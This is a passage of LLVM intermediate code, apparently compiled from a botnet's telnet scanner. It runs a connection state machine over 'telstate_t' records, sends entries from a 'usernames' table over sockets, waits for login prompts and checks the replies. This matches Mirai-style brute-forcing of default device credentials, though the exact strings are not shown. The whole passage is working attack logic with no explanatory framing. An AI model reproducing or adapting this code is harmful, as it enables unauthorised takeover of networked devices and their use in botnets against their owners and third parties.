  %351 = load i32, i32* %2, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %352
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %353, i32 0, i32 3
  store i8 1, i8* %354, align 1
  br label %355

355:                                              ; preds = %340, %337
  br label %356

356:                                              ; preds = %355, %336
  %357 = load i32, i32* %2, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %358
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %359, i32 0, i32 6
  %361 = load i32, i32* %360, align 4
  %362 = add i32 %361, 10
  %363 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %364 = icmp ult i32 %362, %363
  br i1 %364, label %365, label %380

365:                                              ; preds = %356
  %366 = load i32, i32* %2, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 0
  %370 = load i32, i32* %369, align 16
  %371 = call i32 @sclose(i32 noundef %370)
  %372 = load i32, i32* %2, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %373
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %374, i32 0, i32 2
  store i8 0, i8* %375, align 8
  %376 = load i32, i32* %2, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 3
  store i8 1, i8* %379, align 1
  br label %380

380:                                              ; preds = %365, %356
  br label %1949

381:                                              ; preds = %69
  %382 = load i32, i32* %2, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %383
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %384, i32 0, i32 6
  %386 = load i32, i32* %385, align 4
  %387 = icmp eq i32 %386, 0
  br i1 %387, label %388, label %394

388:                                              ; preds = %381
  %389 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %390 = load i32, i32* %2, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %391
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %392, i32 0, i32 6
  store i32 %389, i32* %393, align 4
  br label %394

394:                                              ; preds = %388, %381
  %395 = load i32, i32* %2, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %396
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %397, i32 0, i32 0
  %399 = load i32, i32* %398, align 16
  %400 = load i32, i32* %2, align 4
  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %401
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %402, i32 0, i32 8
  %404 = load i8*, i8** %403, align 8
  %405 = load i32, i32* %2, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %406
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %407, i32 0, i32 7
  %409 = load i16, i16* %408, align 16
  %410 = zext i16 %409 to i32
  %411 = call i32 @readUntil(i32 noundef %399, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i64 0, i64 0), i32 noundef 0, i32 noundef 0, i32 noundef 10000, i8* noundef %404, i32 noundef 1024, i32 noundef %410)
  %412 = icmp ne i32 %411, 0
  br i1 %412, label %413, label %445

413:                                              ; preds = %394
  %414 = load i32, i32* %2, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %415
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %416, i32 0, i32 6
  store i32 0, i32* %417, align 4
  %418 = load i32, i32* %2, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %419
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %420, i32 0, i32 7
  store i16 0, i16* %421, align 16
  %422 = load i32, i32* %2, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %424, i32 0, i32 8
  %426 = load i8*, i8** %425, align 8
  %427 = call i8* @strstr(i8* noundef %426, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i64 0, i64 0)) #11
  %428 = icmp ne i8* %427, null
  br i1 %428, label %429, label %434

429:                                              ; preds = %413
  %430 = load i32, i32* %2, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %431
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %432, i32 0, i32 2
  store i8 5, i8* %433, align 8
  br label %439

434:                                              ; preds = %413
  %435 = load i32, i32* %2, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 2
  store i8 3, i8* %438, align 8
  br label %439

439:                                              ; preds = %434, %429
  %440 = load i32, i32* %2, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 8
  %444 = load i8*, i8** %443, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %444, i8 0, i64 1024, i1 false)
  br label %1950

445:                                              ; preds = %394
  %446 = load i32, i32* %2, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %447
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %448, i32 0, i32 0
  %450 = load i32, i32* %449, align 16
  %451 = load i32, i32* %2, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %452
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %453, i32 0, i32 8
  %455 = load i8*, i8** %454, align 8
  %456 = load i32, i32* %2, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %457
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %458, i32 0, i32 7
  %460 = load i16, i16* %459, align 16
  %461 = zext i16 %460 to i32
  %462 = call i32 @readUntil(i32 noundef %450, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.42, i64 0, i64 0), i32 noundef 0, i32 noundef 0, i32 noundef 10000, i8* noundef %455, i32 noundef 1024, i32 noundef %461)
  %463 = icmp ne i32 %462, 0
  br i1 %463, label %464, label %500

464:                                              ; preds = %445
  %465 = load i32, i32* %2, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %466
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %467, i32 0, i32 6
  store i32 0, i32* %468, align 4
  %469 = load i32, i32* %2, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %470
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %471, i32 0, i32 7
  store i16 0, i16* %472, align 16
  %473 = load i32, i32* %2, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %474
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %475, i32 0, i32 8
  %477 = load i8*, i8** %476, align 8
  %478 = call i8* @strstr(i8* noundef %477, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i64 0, i64 0)) #11
  %479 = icmp ne i8* %478, null
  br i1 %479, label %480, label %485

480:                                              ; preds = %464
  %481 = load i32, i32* %2, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %482
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %483, i32 0, i32 2
  store i8 5, i8* %484, align 8
  br label %490

485:                                              ; preds = %464
  %486 = load i32, i32* %2, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 2
  store i8 3, i8* %489, align 8
  br label %490

490:                                              ; preds = %485, %480
  %491 = load i32, i32* %2, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %492
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 8
  %495 = load i8*, i8** %494, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %495, i8 0, i64 1024, i1 false)
  %496 = load i32, i32* %2, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 2
  store i8 3, i8* %499, align 8
  br label %1950

500:                                              ; preds = %445
  %501 = load i32, i32* %2, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %502
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %503, i32 0, i32 8
  %505 = load i8*, i8** %504, align 8
  %506 = call i64 @strlen(i8* noundef %505) #11
  %507 = trunc i64 %506 to i16
  %508 = load i32, i32* %2, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 7
  store i16 %507, i16* %511, align 16
  br label %512

512:                                              ; preds = %500
  br label %513

513:                                              ; preds = %512
  %514 = load i32, i32* %2, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %515
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %516, i32 0, i32 6
  %518 = load i32, i32* %517, align 4
  %519 = add i32 %518, 10
  %520 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %521 = icmp ult i32 %519, %520
  br i1 %521, label %522, label %537

522:                                              ; preds = %513
  %523 = load i32, i32* %2, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %524
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %525, i32 0, i32 0
  %527 = load i32, i32* %526, align 16
  %528 = call i32 @sclose(i32 noundef %527)
  %529 = load i32, i32* %2, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %530
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %531, i32 0, i32 2
  store i8 0, i8* %532, align 8
  %533 = load i32, i32* %2, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 3
  store i8 1, i8* %536, align 1
  br label %537

537:                                              ; preds = %522, %513
  br label %1949

538:                                              ; preds = %69
  %539 = load i32, i32* %2, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %540
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %541, i32 0, i32 0
  %543 = load i32, i32* %542, align 16
  %544 = load i32, i32* %2, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %545
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %546, i32 0, i32 4
  %548 = load i8, i8* %547, align 2
  %549 = zext i8 %548 to i64
  %550 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %549
  %551 = load i8*, i8** %550, align 8
  %552 = load i32, i32* %2, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 4
  %556 = load i8, i8* %555, align 2
  %557 = zext i8 %556 to i64
  %558 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %557
  %559 = load i8*, i8** %558, align 8
  %560 = call i64 @strlen(i8* noundef %559) #11
  %561 = call i64 @send(i32 noundef %543, i8* noundef %551, i64 noundef %560, i32 noundef 16384)
  %562 = icmp slt i64 %561, 0
  br i1 %562, label %563, label %578

563:                                              ; preds = %538
  %564 = load i32, i32* %2, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 0
  %568 = load i32, i32* %567, align 16
  %569 = call i32 @sclose(i32 noundef %568)
  %570 = load i32, i32* %2, align 4
  %571 = sext i32 %570 to i64
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %571
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %572, i32 0, i32 2
  store i8 0, i8* %573, align 8
  %574 = load i32, i32* %2, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 3
  store i8 1, i8* %577, align 1
  br label %1950

578:                                              ; preds = %538
  %579 = load i32, i32* %2, align 4
  %580 = sext i32 %579 to i64
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %580
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %581, i32 0, i32 0
  %583 = load i32, i32* %582, align 16
  %584 = call i64 @send(i32 noundef %583, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %585 = icmp slt i64 %584, 0
  br i1 %585, label %586, label %601

586:                                              ; preds = %578
  %587 = load i32, i32* %2, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %588
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %589, i32 0, i32 0
  %591 = load i32, i32* %590, align 16
  %592 = call i32 @sclose(i32 noundef %591)
  %593 = load i32, i32* %2, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %594
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %595, i32 0, i32 2
  store i8 0, i8* %596, align 8
  %597 = load i32, i32* %2, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %598
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %599, i32 0, i32 3
  store i8 1, i8* %600, align 1
  br label %1950

601:                                              ; preds = %578
  %602 = load i32, i32* %2, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %603
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %604, i32 0, i32 2
  store i8 4, i8* %605, align 8
  br label %1949

606:                                              ; preds = %69
  %607 = load i32, i32* %2, align 4
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %608
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %609, i32 0, i32 6
  %611 = load i32, i32* %610, align 4
  %612 = icmp eq i32 %611, 0
  br i1 %612, label %613, label %619

613:                                              ; preds = %606
  %614 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %615 = load i32, i32* %2, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %616
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %617, i32 0, i32 6
  store i32 %614, i32* %618, align 4
  br label %619

619:                                              ; preds = %613, %606
  %620 = load i32, i32* %2, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %621
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %622, i32 0, i32 0
  %624 = load i32, i32* %623, align 16
  %625 = load i32, i32* %2, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %626
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %627, i32 0, i32 8
  %629 = load i8*, i8** %628, align 8
  %630 = load i32, i32* %2, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %631
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %632, i32 0, i32 7
  %634 = load i16, i16* %633, align 16
  %635 = zext i16 %634 to i32
  %636 = call i32 @readUntil(i32 noundef %624, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %629, i32 noundef 1024, i32 noundef %635)
  %637 = icmp ne i32 %636, 0
  br i1 %637, label %638, label %670

638:                                              ; preds = %619
  %639 = load i32, i32* %2, align 4
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %640
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %641, i32 0, i32 6
  store i32 0, i32* %642, align 4
  %643 = load i32, i32* %2, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %645, i32 0, i32 7
  store i16 0, i16* %646, align 16
  %647 = load i32, i32* %2, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %648
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %649, i32 0, i32 8
  %651 = load i8*, i8** %650, align 8
  %652 = call i8* @strstr(i8* noundef %651, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0)) #11
  %653 = icmp ne i8* %652, null
  br i1 %653, label %654, label %659

654:                                              ; preds = %638
  %655 = load i32, i32* %2, align 4
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %656
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %657, i32 0, i32 2
  store i8 5, i8* %658, align 8
  br label %664

659:                                              ; preds = %638
  %660 = load i32, i32* %2, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 2
  store i8 7, i8* %663, align 8
  br label %664

664:                                              ; preds = %659, %654
  %665 = load i32, i32* %2, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %666
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %667, i32 0, i32 8
  %669 = load i8*, i8** %668, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %669, i8 0, i64 1024, i1 false)
  br label %1950

670:                                              ; preds = %619
  %671 = load i32, i32* %2, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 0
  %675 = load i32, i32* %674, align 16
  %676 = load i32, i32* %2, align 4
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %677
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %678, i32 0, i32 8
  %680 = load i8*, i8** %679, align 8
  %681 = load i32, i32* %2, align 4
  %682 = sext i32 %681 to i64
  %683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %682
  %684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %683, i32 0, i32 7
  %685 = load i16, i16* %684, align 16
  %686 = zext i16 %685 to i32
  %687 = call i32 @readUntil(i32 noundef %675, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %680, i32 noundef 1024, i32 noundef %686)
  %688 = icmp ne i32 %687, 0
  br i1 %688, label %689, label %721

689:                                              ; preds = %670
  %690 = load i32, i32* %2, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %691
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %692, i32 0, i32 6
  store i32 0, i32* %693, align 4
  %694 = load i32, i32* %2, align 4
  %695 = sext i32 %694 to i64
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %695
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %696, i32 0, i32 7
  store i16 0, i16* %697, align 16
  %698 = load i32, i32* %2, align 4
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %699
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %700, i32 0, i32 8
  %702 = load i8*, i8** %701, align 8
  %703 = call i8* @strstr(i8* noundef %702, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0)) #11
  %704 = icmp ne i8* %703, null
  br i1 %704, label %705, label %710

705:                                              ; preds = %689
  %706 = load i32, i32* %2, align 4
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %707
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %708, i32 0, i32 2
  store i8 5, i8* %709, align 8
  br label %715

710:                                              ; preds = %689
  %711 = load i32, i32* %2, align 4
  %712 = sext i32 %711 to i64
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %712
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %713, i32 0, i32 2
  store i8 7, i8* %714, align 8
  br label %715

715:                                              ; preds = %710, %705
  %716 = load i32, i32* %2, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %717
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %718, i32 0, i32 8
  %720 = load i8*, i8** %719, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %720, i8 0, i64 1024, i1 false)
  br label %1950

721:                                              ; preds = %670
  %722 = load i32, i32* %2, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %723
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %724, i32 0, i32 8
  %726 = load i8*, i8** %725, align 8
  %727 = call i8* @strstr(i8* noundef %726, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #11
  %728 = icmp ne i8* %727, null
  br i1 %728, label %729, label %744

729:                                              ; preds = %721
  %730 = load i32, i32* %2, align 4
  %731 = sext i32 %730 to i64
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %731
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %732, i32 0, i32 0
  %734 = load i32, i32* %733, align 16
  %735 = call i32 @sclose(i32 noundef %734)
  %736 = load i32, i32* %2, align 4
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %737
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %738, i32 0, i32 2
  store i8 0, i8* %739, align 8
  %740 = load i32, i32* %2, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %741
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %742, i32 0, i32 3
  store i8 0, i8* %743, align 1
  br label %1950

744:                                              ; preds = %721
  %745 = load i32, i32* %2, align 4
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %746
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %747, i32 0, i32 8
  %749 = load i8*, i8** %748, align 8
  %750 = call i8* @strstr(i8* noundef %749, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0)) #11
  %751 = icmp ne i8* %750, null
  br i1 %751, label %752, label %767

752:                                              ; preds = %744
  %753 = load i32, i32* %2, align 4
  %754 = sext i32 %753 to i64
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %754
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %755, i32 0, i32 0
  %757 = load i32, i32* %756, align 16
  %758 = call i32 @sclose(i32 noundef %757)
  %759 = load i32, i32* %2, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %760
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %761, i32 0, i32 2
  store i8 0, i8* %762, align 8
  %763 = load i32, i32* %2, align 4
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %764
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %765, i32 0, i32 3
  store i8 0, i8* %766, align 1
  br label %1950

767:                                              ; preds = %744
  %768 = load i32, i32* %2, align 4
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %769
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %770, i32 0, i32 8
  %772 = load i8*, i8** %771, align 8
  %773 = call i8* @strstr(i8* noundef %772, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #11
  %774 = icmp ne i8* %773, null
  br i1 %774, label %775, label %790

775:                                              ; preds = %767
  %776 = load i32, i32* %2, align 4
  %777 = sext i32 %776 to i64
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 0
  %780 = load i32, i32* %779, align 16
  %781 = call i32 @sclose(i32 noundef %780)
  %782 = load i32, i32* %2, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %783
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %784, i32 0, i32 2
  store i8 0, i8* %785, align 8
  %786 = load i32, i32* %2, align 4
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %787
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %788, i32 0, i32 3
  store i8 0, i8* %789, align 1
  br label %1950

790:                                              ; preds = %767
  %791 = load i32, i32* %2, align 4
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 8
  %795 = load i8*, i8** %794, align 8
  %796 = call i8* @strstr(i8* noundef %795, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0)) #11
  %797 = icmp ne i8* %796, null
  br i1 %797, label %798, label %813

798:                                              ; preds = %790
  %799 = load i32, i32* %2, align 4
  %800 = sext i32 %799 to i64
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %800
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %801, i32 0, i32 0
  %803 = load i32, i32* %802, align 16
  %804 = call i32 @sclose(i32 noundef %803)
  %805 = load i32, i32* %2, align 4
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %806
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %807, i32 0, i32 2
  store i8 0, i8* %808, align 8
  %809 = load i32, i32* %2, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %810
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %811, i32 0, i32 3
